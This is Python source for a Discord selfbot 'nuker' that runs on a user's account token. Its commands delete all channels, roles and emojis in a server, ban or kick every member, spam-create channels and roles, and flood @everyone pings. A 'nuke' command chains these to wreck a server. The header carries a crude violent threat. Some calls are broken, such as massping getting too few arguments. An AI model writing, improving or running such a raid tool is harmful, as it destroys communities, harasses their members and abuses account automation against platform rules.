# made with code by Nostorian
# telegram: https://t.me/@nostorian
# DO NOT REMOVE MY CREDITS OR I WILL RAPE YOU

import sys
import json
import time
import datetime
import discord
from discord.ext import commands

with open("config.json", "r") as f:
    data = json.load(f)
bot = commands.Bot(command_prefix='?', help_command=None, self_bot=True)
token = data['token']
if len(token) == 0:
    token = input("Enter your discord token as you may have forgotten to enter it in config.json: ")


@bot.event
async def on_ready():
    print(f"{bot.user} is now logged in!")
    await bot.change_presence(activity=discord.Game(name="github.com/Nostorian", start=datetime.datetime.now()), status=discord.Status.idle)
    


@bot.command()
async def cmd(ctx):
        await ctx.reply("__**Commands**__\n***Please note that all errors and logs will be in your terminal, so please keep that open for checking!***\n```diff\n+ nuke\n# Nukes the author guild!\n+ spam\n# Spams a message in the author channel!\n+ channelspam\n# Spams multiple channels in the author guild!\n+ rolespam\n# Spams multiple roles in the author guild!\n+ massban\n# Bans all users in the author guild!\n+ masskick\n# Kicks all users in the author guild!\n+ massping\n# Spam pings all channels in the author guild!\n+ roledel\n# Deletes all roles in the author guild!\n+ channeldel\n# Deletes all channels in the author guild!\n+ emojidel\n# Deletes all emojis in the author guild!\n```")
@cmd.error
async def cmd_error(ctx: commands.Context, cmd_error: commands.CommandError):    
    print(f"```\nOops... Something went wrong! \n{cmd_error}\n```")

@bot.command()
async def spam(ctx, spam_message, spam_amount: int, spam_delay: int):
    print(f"Starting spam command in {ctx.guild.name}!")
    time.sleep(1)
    for i in range(spam_amount):
        await ctx.send(spam_message)
        time.sleep(spam_delay)
    print(f"Successfully finished spamming in {ctx.guild.name}!")
     
@spam.error
async def spam_error(ctx: commands.Context, s_error: commands.CommandError):
    if isinstance(s_error, commands.MissingRequiredArgument):
        print("The correct syntax to use this command is: \n`?spam spam_message spam_amount spam_delay` \nExample: `?spam imaginebeingaskid 10 5`")
    else:
        print(f"```\nOops... Something went wrong! \n{s_error}\n```")


    
@bot.command()
async def channelspam(ctx, channel_name, channelspam_amount: int, channelspam_delay: int):
    print(f"Starting channel creation spam command in {ctx.guild.name}!")
    time.sleep(1)
    for i in range(channelspam_amount):
        await ctx.guild.create_text_channel(channel_name)
        time.sleep(channelspam_delay)
    print(f"Successfully finished channel creation spam in {ctx.guild.name}!")

@channelspam.error
async def channelspam_error(ctx: commands.Context, cs_error: commands.CommandError):
    if isinstance(cs_error, commands.MissingRequiredArgument):
        print("The correct syntax to use this command is: \n`?channelspam channelspam_name channelspam_amount channelspam_delay` \nExample: `?channelspam imaginebeingaskid 10 5`")
    else:
        print(f"```\nOops... Something went wrong! \n{cs_error}\n```")

    

@bot.command()
async def channeldel(ctx, channeldel_delay: int):
    print(f"Starting channel deletion command in {ctx.guild.name}!")
    time.sleep(1)
    for c in ctx.guild.channels:
        try:
            await c.delete()
            print(f"Deleted channel: {c.name}")
            time.sleep(channeldel_delay)
        except:
            pass
    await ctx.guild.create_text_channel("sheeesh nuked")
    print(f"Successfully finished channel deletion in {ctx.guild.name}!")
@channeldel.error
async def channeldel_error(ctx: commands.Context, cd_error: commands.CommandError):
    if isinstance(cd_error, commands.MissingRequiredArgument):
        print("The correct syntax to use this command is: \n`?channeldel channeldel_delay` \nExample: `?channeldel 5`")
    else:
        print(f"```\nOops... Something went wrong! \n{cd_error}\n```")
        
@bot.command()
async def rolespam(ctx, rolespam_name, rolespam_amount: int, rolespam_delay: int):
    print(f"Starting role creation spam command in {ctx.guild.name}!")
    time.sleep(1)
    for i in range(rolespam_amount):
        await ctx.guild.create_role(name=rolespam_name, colour=discord.Colour.random())
        time.sleep(rolespam_delay)
    print(f"Successfully finished role creation spam in {ctx.guild.name}!")
@rolespam.error
async def channelspam_error(ctx: commands.Context, rs_error: commands.CommandError):
    if isinstance(rs_error, commands.MissingRequiredArgument):
        print("The correct syntax to use this command is: \n`?rolespam rolespam_name rolespam_amount rolespam_delay` \nExample: `?rolespam imaginebeingaskid 10 5`")
    else:
        print(f"```\nOops... Something went wrong! \n{rs_error}\n```")
        
@bot.command()
async def roledel(ctx, roledel_delay: int):
    print(f"Starting role deletion command in {ctx.guild.name}!")
    time.sleep(1)
    for r in ctx.guild.roles:
            if r == ctx.guild.default_role or r == ctx.guild.premium_subscriber_role:
                pass
            else:
                try:
                    await r.delete()
                    print(f"Deleted role: {r.name}")
                    time.sleep(roledel_delay)
                except:
                    pass
    print(f"Successfully finished role deletion in {ctx.guild.name}!")
        
@roledel.error
async def channelspam_error(ctx: commands.Context, rd_error: commands.CommandError):
    if isinstance(rd_error, commands.MissingRequiredArgument):
        print("The correct syntax to use this command is: \n`?roledel roledel_delay` \nExample: `?roledel 5`")
    else:
        print(f"```\nOops... Something went wrong! \n{rd_error}\n```")

@bot.command()
async def massban(ctx, massban_delay: int):
    print(f"Starting mass ban command in {ctx.guild.name}!")
    time.sleep(1)
    for m in ctx.guild.members:
        try:
            await m.ban()
            print(f"Banned user: {m}({m.id}) from {ctx.guild.name}")
            time.sleep(massban_delay)
        except:
            pass
    print(f"Successfully finished mass ban of users in {ctx.guild.name}!")
@massban.error
async def massban_error(ctx: commands.Context, mb_error: commands.CommandError):
    if isinstance(mb_error, commands.MissingRequiredArgument):
        print("The correct syntax to use this command is: \n`?massban massban_delay` \nExample: `?massban 5`")
    else:
        print(f"```\nOops... Something went wrong! \n{mb_error}\n```")

@bot.command()
async def masskick(ctx, masskick_delay: int):
    print(f"Starting mass kick command in {ctx.guild.name}!")
    time.sleep(1)
    for m in ctx.guild.members:
        try:
            await m.kick()
            print(f"Kicked user: {m}({m.id}) from {ctx.guild.name}")
            time.sleep(masskick_delay)
        except:
            pass
    print(f"Successfully finished mass kick of users in {ctx.guild.name}!")
@masskick.error
async def masskick_error(ctx: commands.Context, mk_error: commands.CommandError):
    if isinstance(mk_error, commands.MissingRequiredArgument):
        print("The correct syntax to use this command is: \n`?masskick masskick_delay` \nExample: `?masskick 5`")
    else:
        print(f"```\nOops... Something went wrong! \n{mk_error}\n```")
        
@bot.command()
async def emojidel(ctx, emojidel_delay: int):
    print(f"Starting emoji deletion command in {ctx.guild.name}!")
    time.sleep(1)
    for e in ctx.guild.emojis:
        try:
            await e.delete()
            print(f"Deleted emoji: {e.id}")
            time.sleep(emojidel_delay)
        except:
            pass
    print(f"Successfully finished emoji deletion in {ctx.guild.name}!")
@emojidel.error
async def emojidel_error(ctx: commands.Context, ed_error: commands.CommandError):
    if isinstance(ed_error, commands.MissingRequiredArgument):
        print("The correct syntax to use this command is: \n`?emojidel emojidel_delay` \nExample: `?emojidel 5`")
    else:
        print(f"```\nOops... Something went wrong! \n{ed_error}\n```")
        
@bot.command()
async def massping(ctx, massping_message, massping_amount: int, massping_delay: int):
    print(f"Starting mass ping command in {ctx.guild.name}!")
    time.sleep(1)
    
    for i in range(massping_amount):
        for c in ctx.guild.text_channels:
            try:
                await c.send(f"||@everyone|| {massping_message}")
                print(f"Sent a message in {c}")
                time.sleep(massping_delay)
            except:
                pass
    print(f"Successfully finished mass ping in {ctx.guild.name}!")
@massping.error
async def massping_error(ctx: commands.Context, mp_error: commands.CommandError):
    if isinstance(mp_error, commands.MissingRequiredArgument):
        print("The correct syntax to use this command is: \n`?massping massping_message massping_amount massping_delay` \nExample: `?massping imaginebeingaskid 10 5`")
    else:
        print(f"```\nOops... Something went wrong! \n{mp_error}\n```")
        
@bot.command()
async def nuke(ctx):
    await channeldel(ctx, 0.5)
    time.sleep(1)
    await roledel(ctx, 0.5)
    time.sleep(1)
    await emojidel(ctx, 0.5)
    time.sleep(1)
    await massban(ctx, 0.5)
    time.sleep(1)
    await channelspam(ctx, "nukedlmfao", 499, 0.5)
    time.sleep(1)
    await rolespam(ctx, "nukedlmfao", 249, 0.5)
    time.sleep(1)
    await massping(ctx, "enjoy being nuked babes UwU", 99)
    time.sleep(1)
    print("damn thats a lot of damage sheeesh")
@nuke.error
async def nuke_error(ctx: commands.Context, nuke_error: commands.CommandError):
    print(f"```\nOops... Something went wrong! \n{nuke_error}\n```")
    
@bot.command()
async def shutdown(ctx):
    await ctx.reply("Goodbye!")
    sys.exit()
bot.run(token)